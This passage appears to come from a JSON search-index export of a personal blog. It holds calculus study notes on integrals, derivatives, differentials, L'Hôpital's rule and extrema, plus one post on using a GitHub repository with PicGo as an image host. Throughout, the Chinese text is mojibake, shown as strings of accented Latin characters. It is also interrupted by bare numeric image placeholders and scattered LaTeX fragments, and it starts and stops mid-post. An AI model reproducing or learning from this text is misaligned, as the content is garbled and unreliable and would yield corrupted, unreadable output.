zæ˜¯æ­£çš„è¡¨ç¤ºæ±‚çš„ä¸ŠåŠéƒ¨åˆ†ï¼Œè´Ÿçš„è¡¨ç¤ºä¸‹åŠéƒ¨åˆ†ã€‚ æ—‹è½¬æŠ›ç‰©é¢ï¼š 1601355316536 åŒæ›²æŠ›ç‰©é¢ï¼š 1601355447432 å¤šå…ƒå‡½æ•°é‚»åŸŸ å¼€é›†ï¼šæ‰€æœ‰çš„ç‚¹éƒ½æ˜¯å†…ç‚¹ 1601398417032 é—­åŒºåŸŸï¼šæ—¢åŒ…å«å†…ç‚¹å’Œè¾¹ç•Œç‚¹ äºŒå…ƒå‡½æ•°çš„æé™ è¯æ˜æé™ä¸å­˜åœ¨ æ‰¾ä¸¤ç§ä¸åŒçš„é€¼è¿‘æ–¹å¼ 1601399459395 ä¾‹é¢˜ï¼š 1601399650482 1601399792399 æ±‚æé™ 1601400065760 1601400252209 1601400533096 è¿ç»­1601400850590","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"å¹¿ä¹‰ç§¯åˆ†å’Œç‘•ç§¯åˆ†","slug":"å¹¿ä¹‰ç§¯åˆ†","date":"2020-09-28T05:58:19.000Z","updated":"2021-04-11T17:11:28.866Z","comments":true,"path":"å¹¿ä¹‰ç§¯åˆ†/","link":"","permalink":"https://blog.kayleh.top/%E5%B9%BF%E4%B9%89%E7%A7%AF%E5%88%86/","excerpt":"","text":"å¹¿ä¹‰ç§¯åˆ†1601302982305 æ— ç©·é™ç§¯åˆ†â‘ ä¸Šé™æ˜¯æ— ç©·çš„ï¼Œå°±å¯¹bæ±‚å¯¼ 1601303240702 å¦‚æœæé™å­˜åœ¨ï¼Œå°±æ˜¯æ”¶æ•›çš„ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°±æ˜¯å‘æ•£çš„ã€‚ â‘¡ä¸‹é™æ˜¯æ— ç©·çš„ï¼Œå°±å¯¹aæ±‚å¯¼ 1601303277989 â‘¢ä¸Šä¸‹é™éƒ½æ˜¯æ— ç©· 1601303420141 ç»“åˆâ‘ å’Œâ‘¡æ¥æ±‚ã€‚ ä¾‹é¢˜ï¼š1601303693780 å¹¿ä¹‰çš„ç‰›é¡¿-è±å¸ƒå°¼èŒ¨å…¬å¼ 1601303809560 æ€»ç»“ï¼š1601303899003 1601304242138 æ€§è´¨ -ä¹Ÿæ”¶æ•› 1601304752667 2ï¼‰ç¬¬äºŒä¸ªæ€§è´¨ã€‚åä¹‹ï¼Œä¸ä¸€å®š åˆ†éƒ¨ç§¯åˆ†å’Œæ¢å…ƒç§¯åˆ†ä¹Ÿæˆç«‹ã€‚ æ”¶æ•›åˆ¤å®šå®šç†ï¼š 1601305473068 â˜…â˜…â˜…æ¯”è¾ƒåˆ¤åˆ«æ³•1601305670196 å¤§æ•›åˆ™å°æ•›ï¼Œå°æ•£å¤§å¿…æ•£ æ‰¾ä¸€ä¸ªæ¯”è¢«ç§¯å‡½æ•°å¤§çš„æ˜“æ¯”å‡½æ•°è¿›è¡Œæ¯”è¾ƒ 1601306623507 ç»å¯¹æ”¶æ•›ã€æ¡ä»¶æ”¶æ•›1601307238632 ç»å¯¹æ”¶æ•›å¿…æ”¶æ•› 1601308675891 #ç‘•ç§¯åˆ†","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"å®šç§¯åˆ†","slug":"å®šç§¯åˆ†","date":"2020-09-26T04:38:49.000Z","updated":"2021-04-11T17:11:28.849Z","comments":true,"path":"å®šç§¯åˆ†/","link":"","permalink":"https://blog.kayleh.top/%E5%AE%9A%E7%A7%AF%E5%88%86/","excerpt":"","text":"å®šç§¯åˆ†æ€§è´¨ æ’å…¥åˆ†ç‚¹ï¼ŒåŒºé—´å†…å–ä»»æ„å€¼ï¼Œæ±‚ä»»æ„å€¼çš„å‡½æ•°å€¼ï¼Œ$â–³x_n$å°åŒºé—´çš„é•¿åº¦ æ‹‰å§†è¾¾æ˜¯æœ€å¤§çš„åŒºé—´ 1601053742391 å®šä¹‰$f(x)$åœ¨$[a,b]$æœ‰ç•Œï¼Œåœ¨$[a,b]$ä»»æ„æ’å…¥åˆ†ç‚¹ åˆ†æˆnä¸ªåŒºé—´ï¼Œâ–³x_1,â–³x_2â€¦.â–³x_n,ä»»å–ä¸€ç‚¹ $\\xi_i$ \\int_a^b{f(x)dx}=\\lim_{\\lambda \\to 0} \\sum_{i=1}^n{f(\\xi_i)â–³x_i}\\lambda=max\\{â–³x_1...â–³x_n\\}æ³¨æ„ï¼š1601055940188 ä¸¤ä¸ªå›¾åƒéƒ½æ˜¯ä¸€æ ·çš„ å®šç†1ï¼‰è¿ç»­å°±å¯ç§¯ 2ï¼‰æœ‰ç•Œï¼Œæœ‰é™ä¸ªé—´æ–­ç‚¹ï¼Œå¯ç§¯ å‡ ä½•æ„ä¹‰1601056351353 â‘¡ç§¯åˆ†ç­‰äºé¢ç§¯çš„ç›¸åæ•° ä¾‹é¢˜1601056797153 å®šç§¯åˆ†çš„è¿‘ä¼¼è®¡ç®—çŸ©å½¢æ³•1601089155704 æ¢¯å½¢æ³•1601090462955 æŠ›ç‰©çº¿æ³•1601090743620 æ€§è´¨1ï¼‰å½“b=aæ—¶ï¼Œ \\int_a^a{f(x)=0}2ï¼‰\\int_a^b{f(x)dx}= - \\int_b^a{f(x)dx} 1601100327822 ä¸ç®¡æ˜¯a&lt;c&lt;bè¿˜æ˜¯a&lt;b&lt;c,æ€§è´¨2å…¬å¼éƒ½æˆç«‹ 1601100611938 æ¨è®º1601100749415 1601101052364 æ€§è´¨6 å®šç§¯åˆ†ä¸­å€¼å®šç† f(x)å¿…é¡»æ˜¯è¿ç»­çš„ 1601101655002 åœ¨æœ€å°å€¼å’Œæœ€å¤§å€¼ä¹‹é—´ä¸€å®šèƒ½æ‰¾åˆ°ä¸€ç‚¹$\\xi$ å‡½æ•°å€¼$f(\\xi)$å°±æ˜¯å¹³å‡å€¼ã€‚ å¾®ç§¯åˆ†çš„åŸºæœ¬åŸç†ç§¯åˆ†ä¸Šé™å‡½æ•°1601110706936 xæ˜¯å˜åŒ–çš„ å®šä¹‰1601110816738 ç§¯åˆ†ä¸Šé™å‡½æ•°p(x)æ˜¯è¿ç»­çš„ å®šç†å¦‚æœf(x)åœ¨[a,b]ä¸Šè¿ç»­ï¼Œé‚£ä¹ˆp(x)åœ¨ç§¯åˆ†åŒºåŸŸä¸Šå¯å¯¼ p'(x)=f(x)1)å¦‚æœä¸Šé™æ˜¯xï¼Œç›´æ¥å°†xä»£å…¥è¢«ç§¯å‡½æ•° 1601111539113 2)å¦‚æœxæ˜¯ä¸‹é™ï¼Œå–ç›¸åæ•°ï¼Œå†ç›´æ¥å°†xä»£å…¥è¢«ç§¯å‡½æ•° 1601111632965 3ï¼‰å¦‚æœä¸Šé™æ˜¯xçš„å‡½æ•°g(x) å¤åˆå‡½æ•°æ±‚å¯¼â€”â€”é“¾å¼æ³•åˆ™ 1.æŠŠä¸Šé™g(x)ç›´æ¥ä»£å…¥è¢«ç§¯å‡½æ•° 2.å¯¹ä¸Šé™æ±‚å¯¼gâ€™(x) 1601111926046 4ï¼‰å¦‚æœä¸Šé™æ˜¯xçš„å‡½æ•°h(x) 1.æŠŠä¸Šé™h(x)ç›´æ¥ä»£å…¥è¢«ç§¯å‡½æ•° 2.å¯¹ä¸Šé™æ±‚å¯¼hâ€™(x) 3.å–ç›¸åæ•°ï¼ŒåŠ è´Ÿå· 5ï¼‰ä¸Šä¸‹éƒ½æ˜¯xçš„å‡½æ•°ï¼Œ å¯ä»¥æ ¹æ®ç§¯åˆ†çš„æ€§è´¨ï¼Œåœ¨h(x)å’Œg(x)ä¹‹é—´ä»»å–ä¸€ç‚¹Cï¼Œæ±‚h(x)åˆ°cçš„ç§¯åˆ†å’Œcåˆ°g(x)çš„ç§¯åˆ†ã€‚ 1601112251309 ä¾‹é¢˜1601112870379 1601139602455 ç‰›é¡¿è±å¸ƒå°¼èŒ¨å…¬å¼1601140289642 ä¾‹é¢˜ï¼š 1601142031603 1601142825530 å®šç§¯åˆ†çš„æ¢å…ƒç§¯åˆ†æ³•1601183156945 ä¾‹é¢˜ï¼š1601184315091 3ln3 1601185910499 sinçš„å€¼æ˜¯1åˆ°-1æ¥å›æ³¢åŠ¨ï¼Œåœ¨å› ä¸ºaæ˜¯æ­£çš„ï¼Œæ‰€ä»¥å°±æ˜¯ä»0åˆ°1çš„èŒƒå›´ åˆå¯ä»¥è¿™ä¹ˆå†™ï¼š 1601186045641 â˜…1601186556806 ç§¯åˆ†åŒºé—´å…³äºåŸç‚¹å¯¹ç§° ä¾‹é¢˜ï¼š 1601187310285 $1+x^2$åˆ†ä¹‹1æ˜¯arctanxçš„å¯¼æ•°ï¼Œæå‡ºå»æ‰€ä»¥æ˜¯å¯¹$(arctanx)^2$æ±‚å¯¼ è¯æ˜ï¼š 1601187747971 sinï¼ˆæ´¾/2-Xï¼‰= cosx 1601189272798 åŒæ—¶æ±‚å¯¼ å®šç§¯åˆ†çš„åˆ†éƒ¨ç§¯åˆ†æ³•1601190092256 ä¾‹é¢˜ï¼š 1601191359757 =1/2 ä¼˜å…ˆçº§ï¼šåå¯¹å¹‚ä¸‰æŒ‡ 1601192056564 åº”ç”¨æ±‚é¢ç§¯1601224434165 xå‹ï¼šå‚ç›´äºxè½´ 1601225369727 1601225743031 1601226092741 æ±‚ä½“ç§¯1601226647106 1601226802688 1601226875100 1601227123788 ç»æµé—®é¢˜","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"å›¾åºŠ","slug":"å›¾åºŠ","date":"2020-09-25T04:45:24.000Z","updated":"2021-04-11T17:11:28.818Z","comments":true,"path":"å›¾åºŠ/","link":"","permalink":"https://blog.kayleh.top/%E5%9B%BE%E5%BA%8A/","excerpt":"","text":"åŸåœ°å€https://www.jianshu.com/u/e68ebf1b004c Github repoå›¾åºŠGithubçš„repoä¹Ÿå¯ä»¥å‚¨å­˜ä¸œè¥¿ï¼Œæœ€ç›´æ¥çš„å°±æ˜¯ç¨‹åºçš„ç‰ˆæœ¬æ§åˆ¶ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨æ¥å½“ä½œå¤‡ä»½å‚¨å­˜ï¼Œç”¨æ¥å‚¨å­˜å›¾ç‰‡ï¼ˆgithubå®˜æ–¹å›å¤æ˜¯ï¼šè¯¥è¡Œä¸ºä¸æ„æˆabuseï¼Œå¦‚æœæŠŠgithubå½“å›¾åºŠç®—æ»¥ç”¨ï¼Œé‚£ä¹ˆé‚£ä¹ˆå¤šäººæŠŠå¾®åšå½“å›¾åºŠæ€ä¹ˆå°±ç†æ‰€åº”å½“æï¼‰ã€‚å…¶å®githubå¯¹äºå›½å†…çš„å“åº”é€Ÿåº¦å¹¶ä¸å¿«ï¼Œè€Œä¸”æ—¶ä¸æ—¶è¢«blockï¼Œæ‰€ä»¥ç”¨githubå½“å›¾åºŠå®Œå…¨æ˜¯å‡ºäºå‚¨å­˜ä¸ªäººç”¨é€”çš„è‡ªåˆ›å›¾ç‰‡ï¼Œå¹¶ä¸èƒ½å½“CDNä½¿ç”¨ã€‚githubè‡ªä»è¢«å¾®è½¯æ”¶è´­åï¼Œæˆ‘å¯¹githubçš„ä¿¡å¿ƒå¤§å¢ï¼Œä»£ç ä»¥å‰åªæ•¢ç”¨gitç®¡ç†ä¿å­˜åœ¨æœ¬åœ°ï¼Œç°åœ¨å¯ä»¥æ”¾å¿ƒå¤§èƒ†ä¸Šä¼ åˆ°githubäº†ï¼ˆå¾ˆå¤šæ˜¯privateï¼Œæ‰€ä»¥ä¸å¯è§ï¼‰ï¼Œgithubå›¾åºŠä¸»è¦å°±æ˜¯å›¾ä¸ªç¨³å®šï¼Œä¹Ÿå¹¶ä¸æ˜¯æƒ³æ¶æ„åˆ·githubæœåŠ¡å™¨çš„æµé‡ï¼Œæ¶æ„å½±å“å¤§å®¶çš„ä½“éªŒã€‚ æ–°å»ºrepoï¼Œåç§°ä»»æ„ æ‰“å¼€è´¦æˆ·/Settings/Developer settings/Personal access tokens,ç‚¹å‡»Generate new token img image img image åœ¨å¼¹å‡ºçš„äº§ç”Ÿtokené¡µé¢ï¼ŒToken descriptionéšæ„å¡«å†™ï¼Œä½†æ˜¯ä¸€å®šè¦å‹¾é€‰ä¸Šè¿™å‡ é¡¹ img image ä¸‹è½½PicGoå®¢æˆ·ç«¯å¯¹åº”çš„ç‰ˆæœ¬å¹¶å®‰è£…ï¼Œgithubåœ°å€ï¼šhttps://github.com/Molunerfinn/PicGo/releases å¯åŠ¨PicGoåï¼Œæ‰“å¼€è®¾ç½®ç•Œé¢ï¼Œç‚¹å‡» img image åœ¨ç¬¬ä¸€æ å¡«å…¥ä½ çš„githubåç§°/repoåç§°ï¼›åœ¨ç¬¬äºŒæ å¡«å…¥ä½ çš„åˆ†æ”¯åç§°ï¼Œé»˜è®¤ä¸ºmasterï¼›åœ¨ç¬¬ä¸‰æ å¡«å…¥ä½ åˆšæ‰ç”³è¯·åˆ°çš„Tokenï¼›ç¬¬å››æ å¡«å…¥ä½ çš„repoä¸­çš„å‚¨å­˜è·¯å¾„ï¼›æœ€åç‚¹å‡»ç¡®è®¤ï¼Œå†ç‚¹å‡»è®¾ä¸ºé»˜è®¤å›¾åºŠ ä½¿ç”¨QQæˆªå›¾Ctrl+Alt+Aæˆ–è€…å¾®ä¿¡çš„Alt+Aæˆªå›¾åï¼ŒæŒ‰ä¸‹Ctrl+Shiht+På¿«æ·é”®å³å¯è‡ªåŠ¨ä¸Šä¼ åˆ°githubå¯¹åº”çš„repoä¸­ï¼Œä¸Šä¼ å®Œæˆåï¼Œä¼šæœ‰æç¤ºï¼Œè‡ªåŠ¨å°†å¯¹åº”çš„å›¾ç‰‡åœ°å€é€å…¥å‰ªè´´æ¿ä¸­ï¼Œç›´æ¥Ctrl+Vå³å¯ç²˜è´´å¯¹åº”çš„åœ°å€å‡ºæ¥äº†~~","categories":[],"tags":[{"name":"front","slug":"front","permalink":"https://blog.kayleh.top/tags/front/"}]},{"title":"ä¸å®šç§¯åˆ†","slug":"ä¸å®šç§¯åˆ†","date":"2020-09-23T01:06:12.000Z","updated":"2021-04-11T17:11:28.550Z","comments":true,"path":"ä¸å®šç§¯åˆ†/","link":"","permalink":"https://blog.kayleh.top/%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/","excerpt":"","text":"$Fâ€™(x)=f(x)$ $F(x)$æ˜¯$f(x)$çš„ä¸€ä¸ªåŸå‡½æ•°. F(x)æ˜¯f(x)çš„ä¸€ä¸ªåŸå‡½æ•°ï¼ŒF(x)+cä¹Ÿæ˜¯f(x)çš„åŸå‡½æ•° $f(x)$æ˜¯$Fâ€™(x)$çš„å¯¼å‡½æ•°. çŸ¥é“$Fâ€™(x)$,$f(x)$åªæœ‰å”¯ä¸€ä¸€ä¸ª çŸ¥é“$f(x)$,$Fâ€™(x)$å¯ä»¥æœ‰æ— ç©·å¤šä¸ª ä¸å®šç§¯åˆ†$f(x)$çš„åŸå‡½æ•°çš„å…¨ä½“ $\\int_{}{}f(x) \\text{d}x$ $\\int_{}{}$: sum,ç§¯åˆ†ç¬¦å· $x$: ç§¯åˆ†å˜é‡ $f(x)$: è¢«ç§¯å‡½æ•° $\\int_{}{}f(x) \\text{d}x = F(x)+c$ ä¾‹é¢˜1) $\\int_{}{}x^2 \\text{d}x = \\frac{1}{3}x^3+c$ å‡ ä½•æ„ä¹‰ æ€§è´¨ \\int_{}{}kf(x)\\text{d}x=k\\int_{}{}f(x)\\text{d}xkå¯ä»¥æœå¤–æ‹¿ï¼š â‘ kæ˜¯å¸¸æ•° â‘¡kæ˜¯ä¸xæ— å…³çš„å¦å˜é‡ 1600874436855.png æœ‰é™ä¸ªå¯ä»¥ï¼Œä½†æ— é™ä¸ªä¸èƒ½ åŸºæœ¬ç§¯åˆ†å…¬å¼1600875099212.png ä¾‹é¢˜ï¼š 1600880107488.png 1600880350925.png 1600880532801 ç§¯åˆ†æ³•ç¬¬ä¸€æ¢å…ƒç§¯åˆ†æ³•(å‡‘å¾®åˆ†æ³•) æ±‚åŸå‡½æ•° 1600959600842 1ï¼‰æŠŠdå¤–é¢çš„æŸé¡¹æ‹¿åˆ°dé‡Œé¢(å˜æˆåŸå‡½æ•°) 2ï¼‰å‡‘åŸºæœ¬ç§¯åˆ†å…¬å¼ ä¾‹é¢˜ï¼šdk()=kd() d()é‡Œé¢çš„é¡¹å¯ä»¥éšæ„åŠ å‡å¸¸æ•° 1600964019281 1600965342157 1600966288346 1600966889415 ç¬¬äºŒæ¢å…ƒç§¯åˆ† æ±‚å¯¼ 1600968183522 1600968762395 1600969286878 1600969564112 1600969724741 1600969833171 å…¬å¼åˆ†éƒ¨ç§¯åˆ†æ³•1600996506632.png 1600997159717.png 1600997865246.png 1600998084405 1600998742526 1601020665712.png ä¼˜å…ˆï¼š $e^x,sinx,cosx,x(x^n),lnx,arctanx$ æœ‰ç†å‡½æ•°ç§¯åˆ†åˆ†å­çš„æœ€é«˜æ¬¡æ•°æ¯”è¾ƒé«˜ï¼š 1601020665712.png æœ€é«˜æ¬¡æ•°ç›¸ç­‰(æœ€ç»ˆä½¿åˆ†æ¯æ¬¡æ•°é«˜)ï¼š 1601020930143 æ‰€æœ‰æ–¹æ³•éƒ½è¦åŒ–æˆåˆ†æ¯æ¬¡æ•°æ¯”åˆ†å­æ¬¡æ•°é«˜ã€‚ çœŸåˆ†å¼åˆ†æ¯æ¬¡æ•°æ¯”åˆ†å­æ¬¡æ•°é«˜çš„å«åšçœŸåˆ†å¼ ç¬¬ä¸€ç±»é¢˜ç›®1601021927432 1ï¼‰$b^2-4ac=0$ $ax^2+bx+c=0$ $a(x-x_1)^2=0$ ä¾‹å¦‚ï¼š 2ï¼‰$b^2-4ac&gt;0$ $ax^2+bx+c=0$æœ‰ä¸¤ä¸ªä¸ç­‰çš„æ ¹ $a(x-x_1)(x-x_2)=0$ å¾…å®šç³»æ•°æ³•ï¼š 1601022253671 1601022285476\" style=\"zoom:33%; 1601022327199 3ï¼‰$b^2-4ac&lt;0$ $ax^2+bx+c=0$æ²¡æœ‰å®æ ¹ 1601022770780\" style=\"zoom:33%; 1601022751842 ç¬¬äºŒç±»é¢˜ç›®1601022980770 1ï¼‰$b^2-4ac=0$ $ax^2+bx+c=0$ 1601023694401 2ï¼‰$b^2-4ac&gt;0$ å¾…å®šç³»æ•°æ³•ï¼š 1601023802367 3ï¼‰$b^2-4ac&lt;0$ 1601024256435 ç¬¬ä¸‰ç±»é¢˜ç›®1601028039597 1601030780920 ç¬¬ä¸€ç±»è¡¨è¾¾å¼ 1601030922466 æ¯”å¦‚ï¼š 1601030765738 3ï¼‰ ç¬¬äºŒç±» 1601030987071 1601031354989 è§£æ³•ï¼š 1601032503258 å·¦å³ç›¸ç­‰ï¼š $A_1+2A_2=0$å¹³æ–¹é¡¹ $A_2+2A_3=0$1æ¬¡é¡¹ $A_1+A_3=1$å¸¸æ•°é¡¹ 1601035938562 æˆ–è€…ï¼š 1601036063786","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"å‡½æ•°ä½œå›¾","slug":"å‡½æ•°ä½œå›¾","date":"2020-09-22T21:41:02.000Z","updated":"2021-04-11T17:11:28.623Z","comments":true,"path":"å‡½æ•°ä½œå›¾/","link":"","permalink":"https://blog.kayleh.top/%E5%87%BD%E6%95%B0%E4%BD%9C%E5%9B%BE/","excerpt":"","text":"æ¸è¿‘çº¿ æ°´å¹³ã€å‚ç›´ã€æ–œ æ°´å¹³æ¸è¿‘çº¿1600844913776 ä¾‹é¢˜ï¼š 1600845192751 å‚ç›´æ¸è¿‘çº¿1600845395147 1600845415524 æ–œæ¸è¿‘çº¿1600845708818 ä¾‹é¢˜ï¼š 1600846462394 åˆ†å­æ¬¡æ•°æ¯”åˆ†æ¯é«˜ï¼Œå–æ— ç©· åˆ†å­ä¸åˆ†æ¯æ¬¡æ•°ä¸€æ ·ï¼Œæé™ç­‰äºæœ€é«˜æ¬¡çš„ç³»æ•°ä¹‹æ¯” å¾®åˆ†æ³•ä½œå›¾ â€œå¯¼æ•°â€1600847435593 ä¾‹å¦‚ï¼š 1600850081188\">","categories":[{"name":"é«˜æ•°","slug":"é«˜æ•°","permalink":"https://blog.kayleh.top/categories/%E9%AB%98%E6%95%B0/"}],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"æå€¼å’Œæœ€å€¼","slug":"æå€¼å’Œæœ€å€¼","date":"2020-09-20T07:04:06.000Z","updated":"2021-04-11T17:11:28.918Z","comments":true,"path":"æå€¼å’Œæœ€å€¼/","link":"","permalink":"https://blog.kayleh.top/%E6%9E%81%E5%80%BC%E5%92%8C%E6%9C%80%E5%80%BC/","excerpt":"","text":"æå€¼å’Œæœ€å€¼å®šç†ï¼šf(x)åœ¨$x_0$å¯å¯¼ï¼Œä¸”åœ¨$x_0$å–æå€¼ã€‚$fâ€™(x_0)=0$ è¯æ˜ï¼š 1600782477572 1600782713732 1600782897701 æ±‚æå€¼1600783007899 ä¾‹é¢˜ï¼š 1600783465855 1600783793596 å®šç†ï¼š1600784625648 f(x)çš„äºŒé˜¶å¯¼æ•°ä¹Ÿç­‰äº0çš„æ—¶å€™ï¼Œä¸èƒ½åˆ¤æ–­ï¼š 1600784848861 1600785712089 æœ€å€¼æå€¼æ˜¯å±€éƒ¨åŒºåŸŸçš„ï¼Œæœ€å€¼æ˜¯å…¨éƒ¨åŒºåŸŸ æ±‚æœ€å€¼æ‰¾åˆ°è¿™å‡ ä¸ªç‚¹ï¼š 1600794952240 è¿ç»­å¹¶å•è°ƒçš„å‡½æ•°ï¼Œæœ€å€¼å°±æ˜¯ç«¯ç‚¹ï¼› åœ¨åŒºé—´å†…çš„æå€¼å°±æ˜¯æœ€å€¼ã€‚ 1600795107694","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"å‡½æ•°çš„å•è°ƒæ€§å’Œå‡¸å‡¹æ€§","slug":"å‡½æ•°çš„å•è°ƒæ€§å’Œå‡¸å‡¹æ€§","date":"2020-09-19T21:00:16.000Z","updated":"2021-04-11T17:11:28.633Z","comments":true,"path":"å‡½æ•°çš„å•è°ƒæ€§å’Œå‡¸å‡¹æ€§/","link":"","permalink":"https://blog.kayleh.top/%E5%87%BD%E6%95%B0%E7%9A%84%E5%8D%95%E8%B0%83%E6%80%A7%E5%92%8C%E5%87%B8%E5%87%B9%E6%80%A7/","excerpt":"","text":"å•è°ƒæ€§ å¢fâ€™(x)&gt;0å‡fâ€™(x)&lt;0 fâ€™(x)â‰¥0ï¼Œç­‰å·åœ¨ä¸ªåˆ«ç‚¹ä¸Šæˆç«‹ï¼Œä»ç„¶ä¹Ÿæ˜¯å¢å‡½æ•° 1600590092595 fâ€™(0)ä¸å­˜åœ¨,å·¦å³å¯¼æ•° 1600590517124 1600590714485 1600591157427 1600591335926 å‡¸å‡¹æ€§å®šä¹‰ï¼š 1600591695747 1600592034891 åˆ©ç”¨æ‹‰æ ¼æœ—æ—¥ä¸­å€¼å®šç†ï¼š 1600593230688 ä¾‹é¢˜ï¼š 1600593545557 æ±‚å‡¸å‡¹åŒºé—´å’Œæ‹ç‚¹ï¼š 1600593697583 fâ€˜â€™ä¸å­˜åœ¨ï¼š 1600593903938 1600594115945","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"æ´›å¿…è¾¾æ³•åˆ™","slug":"æ´›å¿…è¾¾æ³•åˆ™","date":"2020-09-19T06:31:17.000Z","updated":"2021-04-11T17:11:28.942Z","comments":true,"path":"æ´›å¿…è¾¾æ³•åˆ™/","link":"","permalink":"https://blog.kayleh.top/%E6%B4%9B%E5%BF%85%E8%BE%BE%E6%B3%95%E5%88%99/","excerpt":"","text":"æ´›å¿…è¾¾æ³•åˆ™ä¸¤ç§å½¢å¼ï¼š\\frac{0}{0}\\frac{\\infty}{\\infty}1600529727634 \\frac{0}{0}1600529882424 1600534332058 ä¾‹é¢˜ï¼š 1600534495973 é‡è¦æé™ä¹Ÿå¯ä»¥ç”¨æ´›å¿…è¾¾æ³•åˆ™è¯æ˜ï¼š 1600534564326 å¿…é¡»æ˜¯$\\frac{0}{0}$å‹æˆ–$\\frac{\\infty}{\\infty}$å‹æ‰å¯ä»¥å†æ¬¡æ±‚å¯¼ã€‚ 1600535683379 1600535923847 \\frac{\\infty}{\\infty}å…¶å®å’Œ$\\frac{0}{0}$æ²¡åŒºåˆ«ï¼š 1600536068546 ä¾‹é¢˜ï¼š 1600536513889 è¶‹äºæ­£æ— ç©·çš„é€Ÿåº¦ï¼š å¯¹æ•°&lt;å¹‚å‡½æ•°&lt;æŒ‡æ•°å‡½æ•° æ´›å¿…è¾¾æ³•åˆ™æ³¨æ„1)åªæœ‰$\\frac{0}{0}$æˆ–$\\frac{\\infty}{\\infty}$æ‰ç”¨ 2)ä¸è¦ä¸€å‘³æ±‚å¯¼ï¼Œä¸é‡è¦æé™ã€ç­‰ä»·æ— ç©·å°æ›¿æ¢ç»“åˆ 3) ä¾‹é¢˜ï¼š 1600537030481 1600537514365 1600537595187 1600537822232","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"å¾®åˆ†","slug":"å¾®åˆ†","date":"2020-09-17T07:39:06.000Z","updated":"2021-04-11T17:11:28.874Z","comments":true,"path":"å¾®åˆ†/","link":"","permalink":"https://blog.kayleh.top/%E5%BE%AE%E5%88%86/","excerpt":"","text":"å¾®åˆ†1600361375405 å¾®åˆ†çš„å®šä¹‰ï¼š1600361823824 å……è¦æ¡ä»¶ å¯å¾®å°±å¯å¯¼ï¼Œå¯å¯¼å°±å¯å¾® 1600362288099 Aå°±æ˜¯$x_0$ä¸Šçš„å¯¼æ•° dy=f^{'}(x)â–³x=f^{'}(x)dx$â–³x=dx$æ˜¯ç²¾ç¡®å€¼ï¼Œ$â–³yâ‰ˆdy$æ˜¯è¿‘ä¼¼å€¼ å¯¼æ•°ä¹Ÿå«å¾®å•† ï¼Œå¯¼æ•°å®šä¹‰çš„dyæ˜¯å¯¹dxæ±‚å¯¼ï¼Œå¯ä»¥çœ‹åšä¸€ä¸ªæ•´ä½“ï¼š 1600363016711 ä¾‹é¢˜ï¼š1600363590738 å¾®åˆ†çš„å‡ ä½•æ„ä¹‰1600363809382\" style=\"zoom:50%; åŸºæœ¬å…¬å¼$dc=câ€™dx=0$ ç•¥ å››åˆ™è¿ç®—1600394726408 ä¾‹é¢˜ï¼š1600395225067 ä¸å˜æ€§ï¼š 1600396809213 1600396977930 1600397139589 1600398508737 å¾®åˆ†åº”ç”¨ è¿‘ä¼¼è®¡ç®— 1600398647225 f(x_0+â–³x)â‰ˆf(x_0)+f'(x_0)â–³x ï¼Œ|â–³x|å–å¾ˆå° ä¾‹é¢˜ï¼š1600400532839 1600401937159 1600403890381 1600404415925 å¾®åˆ†ä¸­å€¼å®šç†è´¹é©¬å®šç†1600413540338 å·¦å¯¼æ•°å’Œå³å¯¼æ•°è¦æƒ³ç›¸ç­‰ï¼Œåªèƒ½ç­‰äº0 âˆ´$f^{â€˜}(x_0)=0$ é©»ç‚¹ï¼šå¯¼æ•°ä¸º0çš„ç‚¹å°±å«é©»ç‚¹ã€‚ ç½—å°”å®šç† æ‹‰å§†æœ—æ—¥ä¸­å€¼å®šç†1600418973628 1600419102500 f(x)åœ¨åŒºé—´Iè¿ç»­ï¼ŒIå†…å¯å¯¼ä¸”å¯¼æ•°æ’ä¸º0ã€‚f(x)=C è¯æ˜ï¼š 1600419285714 æŸ¯è¥¿ä¸­å€¼å®šç†ç”±æ‹‰å§†æœ—æ—¥ä¸­å€¼å®šç†æ¨å‡ºï¼š 1600420461707 1600420576192 æŸ¯è¥¿èƒ½æ¨å‡ºæ‹‰æ ¼æœ—æ—¥å®šç†ï¼Œæ‹‰æ ¼æœ—æ—¥èƒ½æ¨å‡ºç½—å°” 1600421270529 #æ³°å‹’å®šç†1600522802705 å®šç†ï¼š$f(x)$è¡¨ç¤ºæˆ$x-x_0$çš„næ¬¡å¤šé¡¹å¼+$R_n (x)$ 1600524775977 1600525026726 1600525632036 1600525747934","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"å¯¼æ•°","slug":"å¯¼æ•°","date":"2020-09-15T08:20:05.000Z","updated":"2021-04-11T17:11:28.852Z","comments":true,"path":"å¯¼æ•°/","link":"","permalink":"https://blog.kayleh.top/%E5%AF%BC%E6%95%B0/","excerpt":"","text":"å˜åŒ–ç‡$x_0 \\to x_0+â–³x$. $f(x_0) \\to f(x_0+â–³x)$ $\\frac{f(x_0+â–³x)-f(x_0)}{â–³x}$ ä»x_0åˆ°x_0+â–³xçš„å¹³å‡å˜åŒ–ç‡ 1600188583801 å¯¼æ•°çš„å››ä¸ªç¬¦å· 1600188748075 å¯¼æ•°çš„ä¸‰ç§è¡¨è¾¾æ–¹å¼ ä¾‹é¢˜ï¼š1) $y=x^2$ $yâ€™$ $yâ€™|_{x=2}$ 1600189489349 =4; æ±‚å¯¼1600189764709 å¯¼æ•°æ„ä¹‰1600221028096 ä¾‹é¢˜ï¼š æ±‚$y=x^3$åœ¨(1,1)çš„åˆ‡çº¿å’Œæ³•çº¿ 1600250579429 å·¦å³å¯¼æ•°ï¼Œå·¦å³å¯¼æ•°éƒ½å­˜åœ¨å¹¶ç›¸ç­‰ 